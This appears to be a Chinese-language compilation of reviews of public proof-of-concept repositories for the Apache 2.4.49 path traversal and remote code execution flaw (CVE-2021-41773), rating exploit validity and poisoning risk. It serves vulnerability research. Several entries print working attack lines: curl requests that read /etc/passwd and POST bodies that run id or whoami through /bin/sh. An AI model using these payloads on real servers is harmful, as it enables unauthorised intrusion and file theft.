**项目地址:** [mightysai1997/CVE-2021-41773-i-](https://github.com/mightysai1997/CVE-2021-41773-i-)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #36

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773S.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773S.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 & 远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未授权的攻击者访问敏感信息，甚至执行任意代码。

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且配置允许CGI脚本执行或者存在Alias-like指令的配置。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中存在的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造特殊的 URL，绕过 Alias-like 指令的限制，访问服务器上受限目录之外的文件。如果服务器同时启用了 CGI 脚本执行，攻击者还可以通过该漏洞执行任意代码。

**有效性：**

提供的 PoC 代码是有效的。通过发送包含 URL 编码的路径遍历字符的 HTTP 请求，可以读取`/etc/passwd`等敏感文件，或者如果启用了 CGI，则可以执行系统命令。

例如，使用 `curl http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd` 可以尝试读取`/etc/passwd`文件。
如果服务器配置允许 CGI 执行，使用 `curl 'localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'A=|echo;id'` 可以在服务器上执行 `id` 命令。

**投毒风险：**

查看提供的 Dockerfile 和 httpd.conf 文件，未发现明显的恶意代码。`blueteamsteve` 提供的 Docker 镜像配置目的是为了复现漏洞，使得利用更加方便。虽然代码本身没有恶意，但如果攻击者修改 Dockerfile 或者 httpd.conf 文件，加入恶意代码并重新构建镜像，可能会存在投毒风险。从现有信息判断，代码本身投毒风险极低，给出1%的概率。 

**利用方式：**

1.  **路径遍历：** 攻击者通过构造包含`/.%2e/.%2e/`的特殊 URL，尝试访问服务器上的任意文件。`%2e` 是`.`的 URL 编码，用于绕过某些安全限制。
2.  **远程代码执行（RCE）：** 如果服务器启用了 CGI 脚本，攻击者可以通过路径遍历访问到 `/bin/sh` 等 shell 程序，并执行任意命令。

为了成功利用该漏洞，目标服务器需要满足以下条件：

*   运行 Apache HTTP Server 2.4.49 版本。
*   服务器的配置存在 Alias-like 指令，且对受限目录之外的文件没有进行严格的访问控制。
*   可选：服务器启用了 CGI 脚本执行。

**项目地址:** [mightysai1997/CVE-2021-41773S](https://github.com/mightysai1997/CVE-2021-41773S)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #37

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773h.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773h.md)

## CVE-2021-41773-Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行受影响的 Apache HTTP Server 版本，并且 Alias 指令配置不当，允许访问受限目录之外的文件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造包含特殊字符的 URL，绕过 Alias 指令的限制，访问服务器上未授权的文件。如果服务器配置允许 CGI 脚本在这些 aliased 路径下执行，则攻击者可能进一步实现远程代码执行。

**有效性分析：**

根据漏洞库信息和搜索结果，CVE-2021-41773 在野外已被利用。提供的 Dockerfile 使用了 `httpd:2.4.49-alpine` 镜像，明确指定了受影响的 Apache 版本。Dockerfile 下载并替换了默认的 `httpd.conf` 配置文件。如果这个 `httpd.conf` 配置不安全，例如没有正确的 `Require all denied` 规则，那么漏洞利用将是有效的。综上所述，该POC的有效性较高，但依赖于 `httpd.conf` 的具体内容。

**投毒风险分析：**

提供的文件列表中，`LICENSE` 文件是标准的 Apache 许可证，没有投毒风险。Dockerfile本身只包含下载配置文件和替换配置文件的操作。投毒风险主要在于从 `https://raw.githubusercontent.com/itsecurityco/CVE-2021-41773/main/httpd.conf` 下载的 `httpd.conf` 文件。攻击者可能会修改该文件，例如：

*   **放宽访问限制：**  允许访问敏感目录，例如 `/var/www/html` 之外的目录。
*   **配置恶意 CGI 脚本：**  允许执行任意代码。
*   **植入后门：**  在配置文件中添加恶意指令，例如通过 mod_rewrite 实现后门访问。

由于无法直接分析远程 `httpd.conf` 文件的内容，因此存在一定的投毒风险。 这里估计投毒风险为 10%，因为该项目看起来是为了演示漏洞，不太可能包含恶意代码，但仍然需要谨慎。

**利用方式分析：**

利用方式主要通过构造恶意的 HTTP GET 请求，其中包含经过 URL 编码的路径遍历字符。例如，可以使用 `%2e%2e/` 或 `%252e%252e/` 来绕过路径规范化，访问目标目录之外的文件。

例如，如果目标服务器存在以下 Alias 配置：

```
Alias /images /var/www/images
```

攻击者可以使用以下 URL 访问 `/etc/passwd` 文件：

```
GET /images/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
```

如果 CGI 脚本已启用，则可以构造包含恶意代码的 CGI 脚本，并通过路径遍历漏洞执行它，从而实现远程代码执行。

**项目地址:** [mightysai1997/CVE-2021-41773h](https://github.com/mightysai1997/CVE-2021-41773h)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #38

**来源**: [CVE-2021-41773-psibot_apache-vulnerable.md](../2021/CVE-2021-41773-psibot_apache-vulnerable.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal 和 RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal, Remote Code Execution (RCE)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49 或 2.4.50，且配置允许CGI脚本执行，部分Alias目录未进行 require all denied 限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中，是一个路径遍历漏洞。攻击者可以通过构造包含恶意路径的URL，绕过 Alias 指令配置的目录限制，访问服务器上的任意文件，如果目标开启了CGI支持，攻击者可以通过构造恶意请求执行任意代码。该漏洞利用的关键在于路径规范化处理的缺陷，允许攻击者使用 `/.%2e` 绕过限制。

**有效性：**
根据漏洞描述和提供的漏洞利用代码，可以判定该POC代码是有效的。漏洞库信息、搜索引擎结果和漏洞利用代码都确认了该漏洞的存在以及利用方式。Nuclei模板可以用来检测目标服务器是否存在漏洞，而curl命令的POC则直接利用了路径遍历读取 `/etc/passwd` 文件。

**投毒风险：**
提供的代码仓库主要包含Nuclei的YAML模板文件和一个README.md文件。Nuclei模板主要用于漏洞检测，本身不具备直接植入后门的能力。投毒风险主要集中在以下几个方面：
1.  **模板逻辑修改：** 攻击者可能修改模板的匹配规则，使得原本不存在漏洞的服务器也被误判为存在漏洞，从而误导用户进行后续操作。
2.  **模板Payload替换：**  攻击者可能在模板中替换恶意的payload，例如，将读取`/etc/passwd` 替换为执行恶意命令的payload。但提供的模板中直接包含RCE利用，风险相对较小
3.  **依赖库劫持：** 虽然Nuclei本身是安全的，但如果用户使用的Nuclei版本存在依赖库劫持的风险，攻击者可能通过替换Nuclei的依赖库来执行恶意代码。但此风险与本仓库代码关系不大。

因此，综合考虑，该仓库存在一定的投毒风险，但主要集中在Nuclei模板的修改上，而不是直接包含恶意代码。 风险占比10%。

**利用方式：**
1.  **路径遍历（文件读取）：** 攻击者构造包含 `/.%2e/%2e%2e/%2e%2e/%2e%2e/` 序列的URL，尝试读取服务器上的任意文件，例如 `/etc/passwd`。
2.  **远程代码执行 (RCE)：**  如果服务器启用了CGI，攻击者可以通过路径遍历访问到CGI脚本，并通过构造特殊的请求来执行任意命令。具体方法通常依赖于服务器的具体配置和CGI脚本的编写方式。

**项目地址:** [psibot/apache-vulnerable](https://github.com/psibot/apache-vulnerable)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #39

**来源**: [CVE-2021-41773-r0otk3r_CVE-2021-41773.md](../2021/CVE-2021-41773-r0otk3r_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50 (CVE-2021-42013是对CVE-2021-41773的不完全修复)

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，可能需要CGI模块启用，以及Alias配置不当。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造特殊的URL，绕过Alias等指令的限制，访问服务器上的任意文件。如果服务器同时启用了CGI，则可能进一步导致远程代码执行。漏洞利用代码`exploit.py`提供LFI(本地文件包含)和RCE(远程代码执行)两种攻击模式。LFI模式通过构造包含`/.%2e`序列的URL，读取服务器上的文件。RCE模式利用CGI执行命令，通过POST请求发送包含命令的Payload。

**漏洞利用方式：**

1.  **路径遍历 (LFI)：** 攻击者构造包含`/.%2e/%2e%2e`序列的URL，尝试访问受限目录之外的文件，例如`/etc/passwd`。  该漏洞利用代码中的payload1和payload2就是用于此目的，通过拼接路径来尝试读取目标文件。
2.  **远程代码执行 (RCE)：** 如果目标服务器启用了CGI，攻击者可以利用路径遍历漏洞，访问CGI脚本目录，并通过POST请求执行任意命令。漏洞利用代码中的payload3就是用于指定CGI脚本的位置，然后通过构造POST请求，在data中包含要执行的命令。

**关于投毒风险：**
该漏洞利用代码 `exploit.py` 本身看起来比较直接，目的是利用该漏洞。存在投毒的可能性较低，但仍不能完全排除，比如作者可以在交互式shell部分加入一些后门代码,或者在payload中加入恶意指令。经过分析，判断存在10%的投毒风险。`README.md`文件看起来也比较标准，风险较低。

**搜索引擎结果：**
搜索引擎结果表明该漏洞确实存在，且已被广泛利用。多个文章指出该漏洞可以导致敏感信息泄露和远程代码执行。

**项目地址:** [r0otk3r/CVE-2021-41773](https://github.com/r0otk3r/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #40

**来源**: [CVE-2021-41773-redspy-sec_CVE-2021-41773.md](../2021/CVE-2021-41773-redspy-sec_CVE-2021-41773.md)

# CVE-2021-41773

> 📦 该CVE有 **43** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-41773-0xGabe_Apache-CVEs.md](../2021/CVE-2021-41773-0xGabe_Apache-CVEs.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并且CGI脚本已启用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中存在的路径遍历漏洞。攻击者可以利用此漏洞，通过构造包含特殊字符（如 `%2e`，即 URL 编码的点 `.`）的恶意 URL，绕过服务器配置的 Alias 指令限制，访问服务器上受限目录之外的文件。如果目标服务器同时启用了 CGI 脚本的执行，攻击者还可以通过类似的路径遍历方式，执行任意命令。

**有效性评估：**

根据漏洞描述、搜索引擎结果和提供的 POC 代码，可以判定此漏洞的 POC 代码具有较高的有效性。漏洞库信息明确指出此漏洞已被在野利用，搜索引擎结果也提供了相关的利用案例和分析。POC 代码 `cve-2021-41773.py` 提供了路径遍历读取文件以及远程命令执行两种利用方式，并对 Apache 服务器版本进行了简单的指纹识别。

**投毒风险评估：**

分析提供的 POC 代码，`LICENSE` 文件采用标准的 MIT 许可，`README.md` 文件描述了漏洞和利用方法，`cve-2021-41773.py` 文件实现了漏洞利用。代码逻辑相对简单，主要利用 `urllib` 和 `requests` 库发送 HTTP 请求，没有发现明显的恶意代码或者后门。存在极低的投毒风险，例如细微的编码错误或依赖项问题，因此评估投毒风险为 5%。

**利用方式分析：**

利用方式主要有两种：

1.  **路径遍历文件读取：** 攻击者构造包含 URL 编码的路径遍历字符的 URL，例如 `/.%2e/.%2e/.%2e/.%2e/etc/passwd`，尝试读取服务器上的敏感文件。POC 代码中的 `pathTraversal` 函数实现了该功能。

2.  **远程命令执行：**  攻击者利用路径遍历漏洞访问 CGI 脚本目录，并向该目录下的 `sh` (或其他 shell 解释器) 传递要执行的命令。POC 代码中的 `remoteCommandExecution` 函数模拟了这一过程，构造包含命令的 POST 请求，发送到目标服务器。注意，利用此方法需要目标服务器配置允许执行 CGI 脚本。

**项目地址:** [0xGabe/Apache-CVEs](https://github.com/0xGabe/Apache-CVEs)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #2

**来源**: [CVE-2021-41773-0xc4t_CVE-2021-41773.md](../2021/CVE-2021-41773-0xc4t_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且CGI脚本已启用

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中存在的一个路径遍历漏洞。攻击者可以通过构造包含特殊字符（如 URL 编码的 '..', 即 '%2e' 或 '%32%65'）的恶意 URL，绕过 Alias-like 指令配置的目录限制，访问服务器上的任意文件。如果服务器配置允许 CGI 脚本执行，攻击者还可以利用该漏洞执行任意代码。

**利用方式：**

1.  **路径遍历（LFI）:** 攻击者可以使用包含编码后的 '..' 序列的 URL 来访问服务器上的敏感文件，例如 `/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
2.  **远程代码执行（RCE）:** 如果目标服务器的 `/cgi-bin/` 目录启用了 CGI 脚本执行，攻击者可以通过上传恶意脚本并使用路径遍历漏洞来执行它们，例如 `curl 'http://localhost:81/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; whoami'`。

**有效性：**

根据漏洞库信息和搜索结果，提供的 POC 代码是有效的。漏洞库信息中明确指出此漏洞已被在野利用，搜索结果中也提供了大量关于该漏洞的分析和利用方法，POC可以复现LFI和RCE。

**投毒风险：**

此仓库存在轻微的投毒风险（5%），因为攻击者可能会修改 Dockerfile 或 httpd.conf 文件，例如添加恶意的反弹shell脚本到CGI目录，或修改httpd.conf 允许所有目录可访问。 正常的POC验证不会有这种行为, 但是总体上，该仓库主要用于漏洞演示和利用，恶意代码的可能性较低，用户在搭建环境和使用POC时，应该注意检查 Dockerfile 和 httpd.conf 文件。

**项目地址:** [0xc4t/CVE-2021-41773](https://github.com/0xc4t/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #3

**来源**: [CVE-2021-41773-Ask-os_CVE-2021-41773.md](../2021/CVE-2021-41773-Ask-os_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal 和 RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** mod_cgi 必须启用，目标服务器运行 Apache HTTP Server 2.4.49 且相关目录未配置 "require all denied"

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中的一个路径遍历漏洞。该漏洞源于 Apache HTTP Server 在处理 URL 路径时存在缺陷，攻击者可以利用 `/.%2e/` 序列绕过路径规范化检查，从而访问受限目录之外的文件。如果服务器配置允许执行 CGI 脚本，攻击者可以通过构造包含恶意命令的 HTTP 请求执行任意代码，导致远程代码执行（RCE）。

**有效性：**
提供的 POC 代码 (`CVE-2021-42013.py`) 旨在利用此漏洞。它通过 `curl` 命令发送包含路径遍历序列和 shell 命令的 HTTP 请求，从而在目标服务器上执行命令。`README.md` 文件描述了漏洞细节和利用方法，包括依赖项（Python 3 和 `curl`），执行命令的示例，增强了漏洞利用的有效性。

**投毒风险：**
虽然提供的代码旨在利用漏洞，但仍存在轻微的投毒风险的可能性。例如，`README.md` 中可能存在误导信息，导致用户以非预期的方式使用该脚本，或者脚本本身可能包含某些不明显或未记录的功能，但考虑到作者主要目的是复现该漏洞，以及代码整体比较简单，所以推测投毒的可能性为10%。 

**利用方式：**
1.  **路径遍历：** 攻击者利用 URL 中的 `/.%2e/` 序列，尝试访问服务器文件系统上的任意文件。
2.  **CGI 脚本执行：** 如果目标服务器启用了 `mod_cgi` 模块，攻击者可以构造包含恶意命令的 HTTP 请求，并将其发送到 CGI 脚本处理程序。
3.  **远程代码执行：** 服务器执行 CGI 脚本时，会执行攻击者提供的命令，从而实现远程代码执行。

**项目地址:** [Ask-os/CVE-2021-41773](https://github.com/Ask-os/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #4

**来源**: [CVE-2021-41773-CyberQuestor-infosec_CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE.md](../2021/CVE-2021-41773-CyberQuestor-infosec_CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE.md)

## CVE-2021-41773 – Apache HTTP Server 2.4.49 远程代码执行

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历导致远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未授权的攻击者读取任意文件并执行任意代码

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache 2.4.49，并且开启了CGI支持，对Alias配置的目录没有做严格的权限限制（例如 require all denied）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，由于对路径规范化处理不当导致。攻击者可以利用 `%2e` 等编码字符进行路径遍历攻击，访问受限目录之外的文件。如果服务器启用了 CGI，则可以通过构造包含恶意命令的 HTTP 请求来执行任意代码。

**漏洞利用方式：**

1.  **路径遍历：** 利用 `/.%2e` 序列绕过路径检查，访问受限目录之外的文件。
2.  **CGI 执行：** 访问 `cgi-bin` 目录下的文件（或其他配置为 CGI 处理的目录），并在 POST 数据中注入命令，让服务器执行。
3.  **远程代码执行：** 通过执行 `/bin/bash` 或其他 shell 程序，执行任意系统命令。

**POC有效性：**

根据漏洞库信息、搜索结果和提供的漏洞利用代码（README.md），该POC代码是有效的。漏洞库信息明确指出该漏洞已在野外被利用，搜索结果也证实了这一点。提供的 README.md 详细描述了漏洞的原理、利用方法和演示，并给出了可用的 `curl` 命令示例。

**投毒风险分析：**

分析提供的 README.md 文件， 其中包含的curl命令，本质上是利用漏洞执行bash命令，这个本身是漏洞利用的正常方式，不能算作投毒行为，图片文件没有发现可疑代码.

虽然直接可识别的投毒代码的可能性较低，但仍存在以下潜在风险：

*   **依赖性风险：** 如果 exploit 依赖于外部资源（例如，下载脚本或库），则这些资源可能被篡改，从而引入恶意代码。
*   **隐蔽的 Payload：** 恶意代码可能隐藏在看似无害的注释、变量名或字符串中，需要更深入的代码分析才能发现。
*   **误导性信息：** README.md 文件中的信息可能具有误导性，导致使用者在不知情的情况下执行恶意操作。

综合以上因素，我估计存在10%的投毒风险，主要是考虑到潜在的隐蔽Payload和对外部资源的依赖风险。

为了降低风险，建议：

*   仔细审查所有代码，包括注释和变量名。
*   在隔离的环境中运行 POC 代码。
*   使用最新的安全工具检测潜在的恶意代码。
*   关注与此漏洞相关的安全信息和更新。

**项目地址:** [CyberQuestor-infosec/CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE](https://github.com/CyberQuestor-infosec/CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #5

**来源**: [CVE-2021-41773-FakesiteSecurity_CVE-2021-41773.md](../2021/CVE-2021-41773-FakesiteSecurity_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal / Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** Apache HTTP Server 版本为2.4.49，并且存在Alias-like指令配置，且这些目录下的文件未被"require all denied"保护，CGI脚本被启用。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞信息和搜索结果，CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，如果配置不当，可能导致远程代码执行。

**有效性：**

提供的POC代码（`cve-2021-41773.py`, `cve-2021-41773_RCE.py`, `cve-2021-41773_manual.py`）旨在利用此漏洞。 `cve-2021-41773.py` 尝试读取 `/etc/passwd` 文件以验证漏洞的存在。`cve-2021-41773_RCE.py` 尝试通过 CGI 脚本执行命令。

根据搜索结果，该漏洞在野外被积极利用，因此，提供的POC代码很可能有效，但成功利用取决于目标服务器的配置。

**投毒风险：**

审查提供的POC代码，没有发现明显的恶意代码或后门。代码的功能是扫描目标是否存在漏洞，并尝试利用漏洞读取文件或执行命令。`cve-2021-41773.py`的第49行给出了可以添加常见目录的提示，但本身不具备投毒性。

**利用方式：**

1.  **路径遍历：** 攻击者使用特殊的 URL 编码序列（例如 `/.%2e/%2e%2e/`）来绕过路径规范化，从而访问 Alias-like 指令配置目录之外的文件。
2.  **文件读取：** 如果目标文件没有被 "require all denied" 保护，攻击者可以读取任意文件，例如 `/etc/passwd`，从而获取敏感信息。
3.  **远程代码执行：** 如果 CGI 脚本被启用，攻击者可以通过构造恶意的 URL 和 POST 数据来执行任意代码。例如，`cve-2021-41773_RCE.py` 使用 `/cgi-bin/` 目录，并尝试执行 `uname` 命令。

总而言之，此漏洞的利用需要特定的配置条件，但如果满足条件，则风险非常高。

**项目地址:** [FakesiteSecurity/CVE-2021-41773](https://github.com/FakesiteSecurity/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #6

**来源**: [CVE-2021-41773-Iris288_CVE-2021-41773.md](../2021/CVE-2021-41773-Iris288_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal & Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的攻击者读取任意文件和执行任意代码。

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且存在Alias-like指令配置不当，CGI脚本已启用，且文件系统权限配置不当，未启用'require all denied'。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，由于路径规范化中的更改不当所致。攻击者可以利用此漏洞将 URL 映射到 Alias-like 指令配置目录之外的文件。如果这些目录之外的文件没有受到默认配置 "require all denied" 的保护，这些请求可能会成功。如果还为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者通过构造包含特殊字符（如`.%2e`或`..`）的恶意 URL，绕过服务器的安全检查，访问受限目录之外的文件。
2.  **文件读取：** 成功利用路径遍历后，攻击者可以读取服务器上的任意文件，包括配置文件、源代码等敏感信息。
3.  **远程代码执行：** 如果目标服务器启用了 CGI 脚本，攻击者可以通过上传或修改 CGI 脚本，执行任意系统命令。

**POC代码分析：**

提供的POC代码是一个 Python 脚本，它利用了路径遍历漏洞来实现远程代码执行。

1.  **目标指定：** 脚本接受目标服务器的 IP 地址或域名作为参数。
2.  **命令执行：** 脚本允许用户输入要执行的命令，并通过构造包含路径遍历的 URL 将命令发送到目标服务器。
3.  **CGI利用：** 脚本假设目标服务器存在一个名为 `s3cret-cgi-bin` 的 CGI 目录，并使用该目录来执行命令。通过POST请求发送经过编码的命令，利用了`bin/sh`执行。
4.  **回显结果：** 脚本将目标服务器返回的结果打印到屏幕上。

**有效性分析：**

提供的漏洞信息和搜索结果表明，该漏洞确实存在且已被公开利用。提供的 POC 代码基本符合该漏洞的利用方式，因此可以认为该 POC 代码是有效的。需要满足相应的环境条件（如 Alias 指令配置、CGI 脚本启用、文件权限配置等）

**投毒风险分析：**

检查了提供的 Python 脚本，没有发现任何明显的恶意代码或后门。脚本的功能仅限于利用漏洞执行用户指定的命令。`README.md` 文件也只是对漏洞的简单描述，未包含恶意内容。可以认为该仓库存在投毒代码的风险非常低，风险为0%。

**排序优先级：**
搜索引擎结果提供了漏洞被广泛利用和分析的信息，漏洞利用代码验证了漏洞利用的可行性，漏洞库信息提供了漏洞的基础信息。因此，搜索引擎结果的优先级高于漏洞利用代码，漏洞利用代码的优先级高于漏洞库信息。

**项目地址:** [Iris288/CVE-2021-41773](https://github.com/Iris288/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #7

**来源**: [CVE-2021-41773-JIYUN02_cve-2021-41773.md](../2021/CVE-2021-41773-JIYUN02_cve-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历/RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中存在的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造特殊的URL，绕过Alias-like指令配置的目录限制，访问到服务器上的任意文件。如果服务器同时开启了CGI脚本执行，攻击者还可以利用该漏洞执行任意代码。

**有效性：**
提供的POC代码构建了一个包含漏洞的Apache HTTP Server 2.4.49环境。Dockerfile使用官方httpd:2.4.49镜像，并将自定义的html文件复制到/usr/local/apache2/htdocs/目录。然后，它安装了bash，并为/usr/local/apache2/htdocs/cgi-bin/test.sh添加了可执行权限。这个Dockerfile本身没有问题，但关键在于test.sh脚本的内容。如果test.sh包含恶意代码，则攻击者可以通过路径遍历漏洞执行它。

**投毒风险：**
Dockerfile只安装了bash,添加了test.sh的执行权限。如果`/tmp/4903a38a210c3406acebc545808a1928/html/cgi-bin/test.sh`脚本内容包含恶意代码，则存在投毒风险。但从dockerfile的内容来看，投毒的概率取决于test.sh,风险较低，大约在10%左右。

**利用方式：**
1.  **路径遍历：** 攻击者可以使用包含`..`序列的URL来遍历文件系统，例如：`http://target:8080/../../../../etc/passwd`，尝试读取服务器上的`/etc/passwd`文件。
2.  **远程代码执行：** 如果目标服务器启用了CGI，攻击者可以使用路径遍历来访问和执行CGI脚本，例如：`http://target:8080/cgi-bin/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fbin/bash -c 'id'`。

**总结：**
漏洞利用的核心在于构造包含特殊字符的URL，绕过服务器的访问控制。如果CGI可用，则可以直接执行代码。利用的成功与否取决于服务器的具体配置和文件权限。

**项目地址:** [JIYUN02/cve-2021-41773](https://github.com/JIYUN02/cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #8

**来源**: [CVE-2021-41773-Mahfujurjust_CVE-2021-41773.md](../2021/CVE-2021-41773-Mahfujurjust_CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且受影响的目录未配置"require all denied"。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 的路径规范化更改中。攻击者可以利用路径遍历攻击将 URL 映射到由 Alias 类指令配置的目录之外的文件。如果这些目录之外的文件不受通常的默认配置“require all denied”保护，则这些请求可能会成功。如果为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

**有效性：**
根据漏洞库信息，该漏洞已被在野利用，说明漏洞的利用具有实际的可能性。

**投毒风险：**
提供的POC代码是一个简单的HTML页面，显示一个404错误页面，并提示存在CVE-2021-41773漏洞。代码本身的功能是展示漏洞的存在，而不包含任何恶意代码。虽然不直接包含投毒代码，但是可能存在间接的风险，例如诱导用户访问恶意网站或执行其他恶意操作。因此，判断投毒风险为10%。

**利用方式：**
1.  **路径遍历：** 攻击者构造包含`..`的URL，尝试访问服务器上的任意文件。例如，`http://target/../../../../etc/passwd`尝试读取`/etc/passwd`文件。
